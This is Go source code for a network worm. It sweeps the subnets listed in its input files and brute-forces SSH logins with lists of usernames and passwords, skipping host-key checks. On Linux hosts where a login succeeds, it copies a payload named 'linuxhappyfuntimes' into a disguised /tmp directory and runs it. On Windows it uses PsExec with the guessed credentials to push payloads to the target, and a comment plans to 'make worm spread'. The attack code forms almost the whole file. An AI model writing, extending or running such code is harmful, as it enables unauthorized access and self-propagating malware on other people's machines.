package main

import (
		"golang.org/x/crypto/ssh"
		"fmt"
		"time"
		"strings"
		"os"
		"log"
		"bufio"
		"strconv"
		"runtime"
		"sync"
		"os/exec"
		"regexp"
	"github.com/tmc/scp"
)

func main() {
	myos := runtime.GOOS

	var user = readinfile("user.txt")
	var passwds = readinfile("passwds.txt")
	var subnets = readinfile("subnets.txt")
	var step = readinfile("step.txt")
	start, err := strconv.ParseInt(step[0], 10, 64)
	if err != nil{
		log.Fatal(err)
	}
	stop, err := strconv.ParseInt(step[1], 10, 0)
	if err != nil{
		log.Fatal(err)
	}
	stepval, err := strconv.ParseInt(step[2], 10, 0)
	if err != nil{
		log.Fatal(err)
	}
	var myip = ""
	var wg sync.WaitGroup
	for i := 0; i < len(subnets); i++ {
		for l := start; l <= stop; l=l+stepval{
			myip = joinstrings(subnets[i],strconv.Itoa(int(l)))
				fmt.Println("Ping Works For IP", myip)
				wg.Add(1)
				go gettingin(myip, user, passwds, myos, &wg)
		}
		}
		wg.Wait()
	 } 
/**
func checkip(myip string) (ipworks bool){
	ipworks = false
	p := fastping.NewPinger()
	ra, err := net.ResolveIPAddr("ip4:icmp", myip)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	p.AddIPAddr(ra)
	p.OnRecv = func(addr *net.IPAddr, rtt time.Duration) {
		ipworks = true
		return
	}
	p.OnIdle = func() {
		return
	}
	err = p.Run()
	if err != nil {
		fmt.Println(err)
	}
	return
}
**/
func gettingin(myip string, user []string, passwds []string, myos string, wg *sync.WaitGroup ){
	n := 0
	var iswin = false
	var passbreak = false
	for j := 0; j < len(user); j++ {
		for k := 0; k < len(passwds); k++ {
			if !(iswin) {
				n = len(getinlinux(myip, user[j], passwds[k]))
			}
			if n == 3 {
				fmt.Printf("\n ssh works for %s with user:%s and pass:%s", myip,user[j],passwds[k] )
				passbreak = true
				break
			}
			if n == 1{
				iswin = true
			}
			if iswin{
				if  myos == "windows"{
					wincon := getinwin(myip, user[j],passwds[k])
					if wincon == 1 {
						fmt.Println("Im in windows with", myip, user[j], passwds[k])
						passbreak = true
						break
					} else if wincon == 2{
						fmt.Printf("\n didnt work windows with %s %s %s", myip ,user[j], passwds[k])
					} else {
						fmt.Println("target machine does not have psexec enabled")
					}
				} else{
					fmt.Println("cant get onto windows from nonwindows :(")
					passbreak = true
					break
				}
			}
			if n == 2{
				fmt.Println("ssh doesn't work for %s with user:%s and pass:%s", myip,user[j],passwds[k] )
			}
		}
		if passbreak {
			passbreak = false
			break
		}
	}
	defer wg.Done()
}

func getinlinux(myip string, user string, passwd string) (myreturn string) {
	sshConfig := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         2 * time.Second,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd)},
	}
	var dest= joinstrings(myip, ":22")
	fmt.Println(dest)
	connection, err := ssh.Dial("tcp", dest, sshConfig)
	if err != nil {
		fmt.Println(err)
		if strings.Contains(err.Error(), "unable to authenticate") {
			return "no"
		} else {
			return "w"
		}
	}

	session := newsession(connection)
	execlinuxcmd(session, "mkdir /tmp/config-err-XJM1ll")
	scpexec(session,"linuxhappyfuntimes.exe", "/tmp/config-err-XJM1ll/linuxhappyfuntimes")
	execlinuxcmd(session,"./tmp/config-err-XJM1ll/linuxhappyfuntimes")
	session.Close()
	return "yes"
}

func newsession(connection *ssh.Client)(session *ssh.Session){
	session, err := connection.NewSession()
	if err != nil {
		panic(err)
	}
	return
}

func execlinuxcmd( session *ssh.Session, cmd string)() {
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		panic(err)
		fmt.Println(output)
	}
	return
}

func scpexec( session *ssh.Session, srcfile string, destfile string)() {
	err := scp.CopyPath(srcfile, destfile, session)
	if err != nil {
		panic(err)
	}
	return
}
/**
	modes := ssh.TerminalModes{
	ssh.ECHO:          0,     // disable echoing
	ssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kbaud
	ssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kbaud
}

	if err := session.RequestPty("xterm", 80, 40, modes); err != nil {
		session.Close()
		fmt.Println("cant open terminal")
		return "no"
	}**/


func getinwin(myip string, user string, passwd string) (wincon int) {
	/*dir, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}*/
	pscom := "PsExec64.exe"
	iparg := joinstrings("\\\\", myip)
	// TODO make worm spread, vs make a popup
	cmd := exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","ipconfig" )
	fmt.Println(user)
	fmt.Println(passwd)
	fmt.Println(cmd)
	output, err := cmd.CombinedOutput()
	fmt.Println(err)
	strout := string(output)

	if regexp.MustCompile(`error code 0`).MatchString(strout) == true { 								//true work case
	/*
		pscom := "psexec.exe \\"
		joinstrings(pscom, myip)
		joinstrings(pscom, " -c worm_windows_amd64.exe")
	*/											//put payload here

		cmd := exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","-c","PsExec64.exe" )
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println(output)
		}
		cmd = exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","-c","linuxhappyfuntimes" )
		output, err = cmd.CombinedOutput()
		if err != nil {
			fmt.Println(output)
		}
		cmd = exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","-c","windowshappyfuntimes" )
		output, err = cmd.CombinedOutput()
		if err != nil {
			fmt.Println(output)
		}

		fmt.Println("exit 1")

		wincon = 1
	} else if regexp.MustCompile(`The user name or password is incorrect.`).MatchString(strout) == true {						//false case
		wincon = 2
		fmt.Println("exit 2")
	} else {											//psexec doesn't work
		wincon = 3
		fmt.Println("exit 3")
	}
	return
}

func joinstrings(string1, string2 string) (mashstring string){
	var strs []string
	strs = append(strs, string1)
	strs = append(strs, string2)
	mashstring = strings.Join(strs, "")
	return
}

func readinfile(myfile string) (readinarr []string){
	file, err := os.Open(myfile)
    if err != nil {
        log.Fatal(err)
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        readinarr = append(readinarr, scanner.Text())
    }

    if err := scanner.Err(); err != nil {
        log.Fatal(err)
    }
    return
}